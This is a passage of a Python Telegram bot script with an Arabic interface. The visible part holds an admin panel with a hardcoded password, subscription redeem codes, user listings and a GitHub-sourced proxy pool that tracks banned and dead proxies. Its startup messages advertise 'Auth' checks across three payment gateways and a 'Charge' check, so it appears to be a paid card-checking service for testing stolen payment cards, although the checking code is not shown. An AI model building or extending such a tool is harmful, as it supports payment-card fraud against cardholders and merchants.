    if user_id != ADMIN_ID:
        return
    bot.send_message(user_id, "🔐 أدخل كلمة المرور:")
    admin_session[user_id] = 'awaiting_password'

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_password')
def check_admin_password(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    if message.text.strip() == "Nemo@1986":
        admin_session[user_id] = 'authenticated'
        show_admin_menu(user_id)
    else:
        bot.send_message(user_id, "❌ كلمة المرور خاطئة.")
        admin_session.pop(user_id, None)

def show_admin_menu(user_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ إنشاء كود", callback_data="admin_create_code"),
        types.InlineKeyboardButton("📋 عرض الأكواد", callback_data="admin_view_codes"),
        types.InlineKeyboardButton("👥 عرض المستخدمين", callback_data="admin_view_users"),
        types.InlineKeyboardButton("🗑️ إلغاء كود", callback_data="admin_revoke_code"),
        types.InlineKeyboardButton("📡 جلب بروكسيات", callback_data="admin_fetch_proxies"),
        types.InlineKeyboardButton("📊 حالة البروكسيات", callback_data="admin_proxy_stats"),
        types.InlineKeyboardButton("❌ خروج", callback_data="admin_logout")
    )
    bot.send_message(user_id, "🛠️ **لوحة الإدارة**", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback(call):
    user_id = call.from_user.id
    if user_id != ADMIN_ID or admin_session.get(user_id) != 'authenticated':
        bot.answer_callback_query(call.id, "غير مصرح لك.")
        return
    
    data = call.data
    if data == "admin_create_code":
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, "📅 أرسل عدد الأيام:")
        admin_session[user_id] = 'awaiting_days'
    elif data == "admin_view_codes":
        bot.answer_callback_query(call.id)
        codes = get_all_codes()
        if not codes:
            bot.send_message(user_id, "📭 لا توجد أكواد.")
            return
        msg = "📜 **الأكواد:**\n\n"
        for code, days, used_by, used_at, created_at in codes[:30]:
            status = "✅ مستخدم" if used_by else "🟢 غير مستخدم"
            msg += f"`{code}` | {days} يوم | {status}\n"
        bot.send_message(user_id, msg, parse_mode="Markdown")
    elif data == "admin_view_users":
        bot.answer_callback_query(call.id)
        users = get_all_users()
        if not users:
            bot.send_message(user_id, "📭 لا يوجد مستخدمون.")
            return
        msg = "👥 **المستخدمون:**\n\n"
        for uid, end_str, credits in users[:50]:
            if uid == ADMIN_ID:
                continue
            if end_str:
                end_date = datetime.fromisoformat(end_str)
                remaining = (end_date - datetime.now()).days
                status = f"متبقي {remaining} يوم" if remaining >= 0 else "منتهي"
            else:
                status = "بدون اشتراك"
            msg += f"🆔 {uid} | {status}\n"
        bot.send_message(user_id, msg, parse_mode="Markdown")
    elif data == "admin_revoke_code":
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, "✏️ أرسل الكود لإلغائه:")
        admin_session[user_id] = 'awaiting_revoke'
    elif data == "admin_fetch_proxies":
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, "📡 جاري سحب البروكسيات...")
        threading.Thread(target=fetch_and_add_proxies, args=(user_id,)).start()
    elif data == "admin_proxy_stats":
        bot.answer_callback_query(call.id)
        active, banned, dead = proxy_pool.get_stats()
        bot.send_message(user_id, f"📊 **البروكسيات:**\n🟢 نشط: {active}\n🟡 محظور: {banned}\n🔴 ميت: {dead}", parse_mode="Markdown")
    elif data == "admin_logout":
        admin_session.pop(user_id, None)
        bot.answer_callback_query(call.id, "تم الخروج")
        bot.send_message(user_id, "👋 تم تسجيل الخروج.")

def fetch_and_add_proxies(user_id):
    proxies = fetch_proxies_from_github()
    if proxies:
        working = add_proxies_to_pool(proxies)
        bot.send_message(user_id, f"✅ تمت إضافة {len(working)} بروكسي.")
    else:
        bot.send_message(user_id, "❌ فشل سحب البروكسيات.")

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_days')
def create_code_days(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    try:
        days = int(message.text.strip())
        if days <= 0:
            raise ValueError
        code = generate_redeem_code(user_id, days)
        bot.send_message(user_id, f"✅ **تم إنشاء الكود**\n📌 `{code}`\n📅 {days} يوم", parse_mode="Markdown")
    except:
        bot.send_message(user_id, "❌ عدد أيام غير صحيح.")
    admin_session[user_id] = 'authenticated'
    show_admin_menu(user_id)

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_revoke')
def revoke_code_input(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    code = message.text.strip()
    if revoke_code(code):
        bot.send_message(user_id, f"✅ تم إلغاء الكود `{code}`")
    else:
        bot.send_message(user_id, f"❌ فشل إلغاء الكود.")
    admin_session[user_id] = 'authenticated'
    show_admin_menu(user_id)

# ================= تشغيل البوت =================
print("✅ البوت شغال مع:")
print("  • فحص Auth متعدد البوابات (3 بوابات)")
print("  • فحص Charge (1 بوابة)")
print("  • نظام اشتراكات ولوحة إدارة")
print(f"📁 قاعدة البيانات: {DB_PATH}")
print("🔥 التوقيع: 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆")
bot.infinity_polling()
